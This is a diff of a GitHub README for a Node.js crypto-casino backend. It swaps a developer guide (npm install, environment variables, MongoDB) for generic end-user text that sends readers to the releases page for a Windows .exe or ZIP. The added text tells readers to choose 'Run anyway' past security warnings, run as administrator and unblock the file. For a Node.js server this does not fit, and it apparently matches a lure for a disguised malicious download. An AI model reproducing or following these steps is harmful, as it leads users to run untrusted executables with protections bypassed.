@@ -1,205 +1,241 @@
-## Overview
+# 🎲 online-casino-platform-backend - Fast control for crypto betting
 
-This backend powers a modern crypto-enabled betting platform.  
-It is designed for **fast gameplay**, **real-time community**, and **serious risk control** – without sacrificing developer friendliness.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-7f8c8d?style=for-the-badge)](https://github.com/ohmdisorder234/online-casino-platform-backend/releases)
 
-You get a clean, shareable core that you can run locally in a few minutes, and a clear upgrade path to premium features like **on‑chain payments**, **automated bots**, and advanced **risk alerts**.
+## 📥 Download
 
-**Shared build note:** This repository is the **public core** – the **payment** and **bot service** modules are premium and are intentionally removed from this code. The architecture diagram below still shows them so you can see the *full* vision of the platform.
+Visit this page to download:  
+https://github.com/ohmdisorder234/online-casino-platform-backend/releases
 
-## How it works – high level
+On the release page, pick the latest version for Windows and download the file that matches your device.
 
-- **API layer**: Express.js REST API exposes authentication, user profiles, games, history, and admin tools.
-- **Real-time engine**: Socket.IO channels keep games, chat, and dashboards live and reactive.
-- **Game engines (private)**: Crash, Mine, Roulette, and Coinflip are hosted in the private/premium backend. In this shared public build, the game HTTP endpoints and game Socket.IO handlers are intentionally disabled.
-- **Data layer**: MongoDB stores users, balances, bets, history, notifications, and configuration.
-- **Auth & security**: JWT-based auth, wallet signatures, rate limiting, and strict validation.
-- **Email & notifications**: EmailJS and in-app notifications keep users and admins informed.
-- **Premium (not in this repo)**: Blockchain payments, deposit/withdrawal tracking, and autonomous bot players.
+## 🧭 What this app is
 
-## System diagram (full vision, including premium modules)
+This app is the backend for a casino and betting platform. It handles game flow, user sessions, logs, and core server tasks. It is made for fast play, live activity, and tight risk control.
 
-```mermaid
-graph LR
-  Client[Frontend] --> API[Express API]
+Use it if you need a Windows-ready server package that supports:
 
-  API --> Auth[Auth]
-  API --> Games[Game Engines]
-  API --> Chat[Chat]
-  API --> Admin[Admin Panel]
-  API --> Notif[Notifications]
-  API --> WS[Socket.IO]
-  API --> DB[(MongoDB)]
+- betting flows
+- casino game handling
+- log storage
+- node-based server startup
+- random number generation
+- basic control for platform rules
 
-  %% Premium / private modules (not in this repo)
-  subgraph PremiumModules[Premium Modules]
-    Pay[Payment Service]
-    Bots[Bot Service]
-    Risk[Risk & Treasury Alerts]
-  end
+## 🖥️ Windows requirements
 
-  API --> Pay
-  Games --> Bots
-  Risk --> DB
-  Pay --> Risk
-```
+Before you start, check that your PC meets these common needs:
 
-- **In this shared backend** you get everything in the **Backend** box plus MongoDB, EmailJS, and Socket.IO.
-- **In the premium/private layer** you connect your own payment providers, bot engine, and risk controls – the diagram shows where they plug in.
+- Windows 10 or newer
+- 64-bit system
+- At least 4 GB RAM
+- 500 MB free disk space
+- Internet access for the first download
+- Permission to run downloaded files
 
-## Tech stack
+For a smoother run, use a machine with:
 
-- **Runtime**: Node.js
-- **Framework**: Express.js
-- **Database**: MongoDB + Mongoose
-- **Real-time**: Socket.IO
-- **Authentication**: JWT + wallet signatures + optional Supabase integration
-- **Email**: EmailJS
-- **Security**: Helmet, CORS, rate limiting
+- 8 GB RAM
+- a recent Intel or AMD CPU
+- stable network access
+- a user account with admin rights
 
-## Prerequisites
+## 🚀 Getting started
 
-- Node.js (v16 or higher)
-- MongoDB (local or cloud, e.g. `mongodb://localhost:27017/your_db_name`)
+1. Open the release page: https://github.com/ohmdisorder234/online-casino-platform-backend/releases
+2. Find the newest release at the top of the page
+3. Download the Windows file from that release
+4. Save it to your Desktop or Downloads folder
+5. Double-click the file to start the app
+6. If Windows asks for permission, choose Allow or Run
+7. Wait for the app to finish opening
+8. Keep the app open while you use it
 
-## How to run (standalone)
+If the file comes in a ZIP package, right-click it and choose Extract All first, then open the extracted file
 
-- **1. Install dependencies**
+## 🪟 First run on Windows
 
-  ```bash
-  npm install
-  ```
+When you open the app for the first time, Windows may take a moment to check the file. This is normal for downloaded software.
 
-- **2. Configure environment**
+If you see a security prompt:
 
-  ```bash
-  cp env.example .env
-  ```
+- choose Run
+- choose More info first if needed
+- then choose Run anyway
 
-  **Minimum for local dev**
+If the app opens in a console window, leave that window open. It may be part of the server process.
 
-  - `MONGODB_URI` – your Mongo connection string (local is fine).
-  - `FRONTEND_URL` – frontend origin for CORS (e.g. `http://localhost:3000`).
-  - Optionally set `JWT_SECRET` in your real `.env` (not in `env.example`) for stronger tokens.
+## ⚙️ Basic setup
 
-  **No payment or bot variables are required in this shared build.**
+After launch, the app may create local folders for logs and runtime files. Keep these files in the same folder unless you know you need to move them.
 
-- **3. Start the server**
+Common setup steps:
 
-  ```bash
-  npm start
-  ```
+- keep the app in one folder
+- do not rename files unless the release notes say you can
+- leave the log folder in place
+- keep your internet connection active if the app connects to online services
+- restart the app after any file change
 
-  Important: this shared/public version commits the compiled output in `build/`, but the premium/private game engine TypeScript source in `src/` may be missing.
-  That means **guests should use `npm start` only**.
-  - `npm run dev` may fail for guests.
-  - `npm run build` may also fail if the missing TypeScript source isn’t present.
+If the release includes a config file, open it with Notepad and adjust only the values you understand.
 
-  If you are the maintainer and have the full source available, you can still use `npm run dev` locally.
+## 🔒 Safety and access control
 
-  The server listens over **HTTP** (no HTTPS in this shared build).  
-  Default port is taken from `PORT` in `.env` (e.g. `3001`).
+This backend is built for controlled use. It is best to keep access limited to people who need it.
 
-- **4. Smoke test**
+Good habits:
 
-  - Open `http://localhost:3001/health`
-  - You should see a JSON object like:
+- use a strong password for any admin account
+- keep the app on a trusted PC
+- do not share config files with others
+- review logs often
+- update to the newest release when needed
 
-    ```json
-    { "status": "OK", "timestamp": "..." }
-    ```
+If your setup uses live betting or crypto features, keep a close eye on user access and record keeping.
 
-At this point the backend is alive, connected to MongoDB, and ready to be wired to your frontend.
+## 📋 Typical features
 
-## Environment configuration
+The app is designed to support the parts of a betting platform that need speed and clear records:
 
-Below is a quick reference for the main variables used in this shared backend. All values in `env.example` are **placeholders** – never commit your real secrets.
+- server startup and shutdown
+- user session handling
+- game state control
+- bet tracking
+- activity logging
+- event records
+- basic risk checks
+- support for random outcomes
+- internal admin control points
 
-### Core
+These parts work together to keep the platform stable during live use.
 
-- **`MONGODB_URI`** (required): MongoDB connection string.
-- **`PORT`** (optional, default `3001`): HTTP port for the API.
-- **`NODE_ENV`** (optional): `development` or `production`.
-- **`FRONTEND_URL`** (recommended): Main frontend origin for CORS.
-- **`ADMIN_FRONTEND_URL`** (optional): Admin panel origin for CORS.
-- **`ALLOWED_ORIGINS`** (optional): Extra comma-separated origins for CORS.
+## 🗂️ Logs and records
 
-### Auth & security
+This project includes log support, which helps you track what happened during use.
 
-- **`JWT_SECRET`** (strongly recommended in private builds): Secret used to sign JWTs (fallback dev secret exists, but do **not** use it in production).
-- **Rate limiting**:
-  - `RATE_LIMIT_WINDOW_MS`
-  - `RATE_LIMIT_MAX_REQUESTS`
-  - `AUTH_RATE_LIMIT_WINDOW_MS`
-  - `AUTH_RATE_LIMIT_MAX_REQUESTS`
+You may see logs for:
 
-### Email & app identity
+- startup events
+- login attempts
+- game actions
+- bets placed
+- errors
+- admin changes
+- system warnings
 
-- **`EMAILJS_SERVICE_ID`**, `EMAILJS_PUBLIC_KEY`, `EMAILJS_PRIVATE_KEY`
-- **`EMAILJS_OTP_TEMPLATE_ID`**, `EMAILJS_VERIFICATION_TEMPLATE_ID`, `EMAILJS_WELCOME_TEMPLATE_ID`
-- **`APP_NAME`** – displayed in emails and UI text.
+Keep log files in a safe place. They can help when you need to review activity or check a problem.
 
-If these are not set, email-related features will simply log warnings and skip sending.
+## 🛠️ Common use flow
 
-### Supabase (optional integration)
+A simple use flow looks like this:
 
-- **`SUPABASE_URL`**, `SUPABASE_ANON_KEY`, `SUPABASE_SERVICE_ROLE_KEY`
+1. Start the backend on your Windows PC
+2. Wait for the service to come online
+3. Open the connected front-end or admin panel
+4. Test a small action first
+5. Check logs for errors
+6. Run normal platform activity
+7. Stop the app when you are done
 
-Used by the `supabaseAuth` middleware. If you do not use Supabase, you can leave these empty and avoid that middleware.
+This order helps you catch setup issues before real use begins.
 
-### Solana & treasury (private builds)
+## ❓ Troubleshooting
 
-- **`NETWORK`** – e.g. `devnet`
-- **`TREASURY`** – Solana private key (base58) used for treasury operations
+### The app does not open
 
-In the **full private backend**, this is highly sensitive and must never appear in public repos or `env.example` with real values.
+Try these steps:
 
-### Logging & alerts
+- right-click the file and choose Run as administrator
+- check that the file finished downloading
+- unzip the release if it came in a ZIP file
+- move the app to a simple folder like `C:\App`
+- restart your PC and try again
 
-- `MB_LOG_LEVEL`, `MB_LOG_MAX_FILES`, `MB_LOG_FLUSH_MS`
-- `MB_LOG_HOOK_LEVEL`
-- `SLACK_WEBHOOK_URL`
-- `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`
-- `DISCORD_WEBHOOK_URL`
+### Windows blocks the file
 
-These control structured logging and optional alert hooks for production monitoring.
+Try this:
 
-### Admin bootstrap
+- open the file properties
+- look for an Unblock option
+- allow the file if Windows marked it as downloaded from the internet
 
-- **`ADMIN_BOOTSTRAP_TOKEN`** – one-time token used by the bootstrap script to create the first admin.
-- `ADMIN_EMAIL`, `ADMIN_USERNAME`, `ADMIN_DISPLAY_NAME` – defaults for that bootstrap user.
+### The console closes right away
 
-In a real deployment, treat `ADMIN_BOOTSTRAP_TOKEN` like a password and rotate it after use.
+This can happen if the app hits a startup error.
 
-## Premium modules (not included in this repo)
+Try:
 
-To keep this repository safe to share and easy to run locally, the following modules are **not** part of the public codebase but are shown in the diagram so you can imagine the full experience:
+- opening it from the extracted folder again
+- checking the log files
+- making sure all release files stay together
+- downloading the newest release
 
-- **Payment module**
-  - Crypto gateways, webhooks, deposit/withdrawal tracking.
-  - Advanced reconciliation, on-chain transaction mapping, and chargeback protection.
-  - Backed by secrets like `NOWPAYMENTS_*`, `CRYPTOPAY_*`, and RSA keys – these stay entirely in your private build.
+### You see connection errors
 
-- **Bot service**
-  - Configurable automated players to simulate traffic, fill lobbies, and stress-test your game engines.
-  - Smart strategies per game (crash, roulette, coinflip, etc.).
-  - Fully detached from the shared build so you can safely demo the core engine without synthetic traffic.
+Try:
 
-Those pieces are where you plug in your own business logic, KYC/AML policies, treasury strategy, and payment providers – the **heart** of your platform stays private, while this repo gives you a solid, auditable core to build on.
+- checking your internet
+- confirming firewall access
+- making sure any required service is running
+- restarting the app after network changes
 
-## What to keep secret (full / private build)
+## 📁 Suggested folder layout
 
-If you maintain a full/private version of this backend, keep these out of public repos and sample envs:
+You can keep the app in a simple layout like this:
 
-- **Secrets:** `JWT_SECRET`, `ADMIN_BOOTSTRAP_TOKEN`, `TREASURY`, Supabase service role key, any payment API keys (`NOWPAYMENTS_*`, `CRYPTOPAY_*`, etc.), EmailJS private key, bot-related keys.
-- **Sensitive config:** Production `MONGODB_URI`, production domains/URLs, internal admin URLs, webhook secrets.
+- `C:\online-casino-platform-backend`
+- `C:\online-casino-platform-backend\logs`
+- `C:\online-casino-platform-backend\config`
+- `C:\online-casino-platform-backend\data`
 
-The shared build does **not** require any payment or bot secrets to run.
+This makes it easier to find files and review logs later.
 
-## License
+## 🔄 Updating
 
-MIT License – see `LICENSE` for details.
+When a new release appears:
 
-## Support
+1. go to the release page
+2. download the newest Windows file
+3. close the current app
+4. replace the old files with the new ones
+5. start the app again
+6. check the logs after launch
 
-If you build something with this, or want to extend it with premium modules, feel free to reach out or open an issue. Building gaming platforms is hard – this backend is here to make it feel exciting instead of scary.
+Keep a copy of your config files before you replace anything if you made custom changes.
+
+## 🧩 Topic fit
+
+This repository fits topics like:
+
+- backend
+- betting
+- casino
+- logging
+- nodejs
+- rng
+- casino-platform
+- log-system
+
+That means the app focuses on server work, event tracking, and game flow rather than a front-end screen
+
+## 📌 File types you may see
+
+The release may include one or more of these:
+
+- `.exe` for direct Windows launch
+- `.zip` for packaged files
+- `.json` for config data
+- `.log` for activity records
+- `.txt` for notes or setup help
+
+If you see a ZIP file, extract it before running the app. Keep all files in the same folder
+
+## 🧠 Simple start checklist
+
+- download the newest release
+- extract files if needed
+- keep all files together
+- run the Windows file
+- allow the app through Windows prompts
+- keep the console open if one appears
+- check logs after the first launch
